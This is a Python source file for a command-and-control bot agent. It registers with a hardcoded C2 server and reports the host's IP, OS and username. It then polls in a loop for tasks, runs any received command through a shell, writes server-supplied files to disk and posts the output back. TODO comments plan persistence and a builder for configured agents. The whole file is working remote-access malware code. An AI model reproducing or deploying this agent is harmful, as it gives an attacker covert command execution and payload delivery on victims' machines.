import requests 
import time
import socket
import json 
import platform
import subprocess
import random
import getpass 

"""
TODO: Create a builder script which creates this agent script 
with specific configurations.

TODO2: Create error checking for checking in with the server 

TODO2-1: Upon three failure of heartbeat ("No such bot response"), 
try re-register 

TODO3: Implement error checking on the entire agent  

TODO4: Create persistence on the script itself. 
"""
# Need to have hardcoded server ip address 

# This is hardcoded, for now 
URL = 'http://localhost:5000'
FIRSTCONTACTKEY = 'firstcontactkey'


def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except:
        IP = '127.0.0.1'
    finally:
        s.close()

        return IP 

def heartbeat(ip, user):
    url = URL + '/heartbeat'

    data = {'ip': ip, 'user': user}

    try:
        res = requests.post(url, data=data)
        return res.text
    except Exception as e:
        pass 

def firstcontact():
    url = URL + '/firstcontact'

    data = {'firstcontactkey': FIRSTCONTACTKEY}


    res = requests.post(url, data=data)

    global REGISTERKEY
    json_data = json.loads(res.text)
    print(res.text)
    REGISTERKEY = json_data['registerkey']
    
def register(ip, os, user):
    url = URL + '/register'

    data = {'registerkey': REGISTERKEY, 'ip': ip, 'os': os, 'user': user}

    res = requests.post(url,data=data)

    data = res.json()

    if 'error' in data:
        exit()


    #return REGISTERKEY

def fetchCommand(ip):
    url = URL + '/bot/' + ip + '/task'
    data = {'registerkey': REGISTERKEY}

    try:
        res = requests.post(url, data=data)
        json_data = json.loads(res.text)
    
    # Unable to connect to the server 
    except Exception as e:
        return '[-] ' + str(e)

    #print("[*] json_data = ", json_data)

    # Command has not been staged. Return [-] and just sleep. 
    if 'command' not in json_data:
        return '[-] ' + str(json_data)

    else:
        command = json_data['command']
        print("[+] Command received: ", command)
        # TODO: Add upload/download/shell related functionality of the agent here 
        if "download" == command.split(' ')[0]:
            try:
                # The destination path might be a problem if the path has space in between. ex) C:\Program Files\ ... 
                filename = command.split(' ')[1]
                destination_path = command.split(' ')[2]

                download_url = URL + '/download/' + filename
                myFile = requests.get(download_url)
                open(destination_path+filename,'wb').write(myFile.content)

            except Exception as e:
                return "[DEBUG] File Download Failed." + str(e) 

            return '[+] Download successful. Filename: ' + filename + ' Destination: ' + destination_path 

        #elif "upload" == command.split(' ')[0]: 
        else:
            try:
                result = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True, timeout=5)
            except Exception as e: 
                payload = "[" + str(e.returncode) + "] " + str(e.output.decode('utf-8'))
                return "Status: FAILED " + payload 
        
        return result.decode('utf-8') 


def submit_result(ip, result):
    url = URL + '/bot/' + ip + '/result'
    
    data = {'registerkey': REGISTERKEY, 'result': result}

    requests.post(url, data=data)


def main():

    user = getpass.getuser()
    print(user)

    if "Linux" in platform.platform():
        host_os = 'Nix'
    elif "Windows" in platform.platform():
        host_os = 'Windows'
    else:
        print("[-] Unidentifiable OS type")

    ip = get_ip()
    firstcontact()
    register(ip,host_os,user)
    
    while(1): 
        beat = heartbeat(ip, user)
        if beat is not None:

            result = fetchCommand(ip)

            # If server response that the bot doesn't have anything, just sleep.
            if isinstance(result, str) and '[-]' in result:
                print("[-] Sleeping...")
                time.sleep(10)
                continue

            print("[DEBUG] Result:", result)
            submit_result(ip, result)

            print("[+] Command feteched and executed. Sleeping ... ")
            
            # This is for production. For PoC, just sleep for 10 seconds.
            #timerandom = random.randint(10,20)
        
        time.sleep(10)


if __name__ == '__main__':
    main()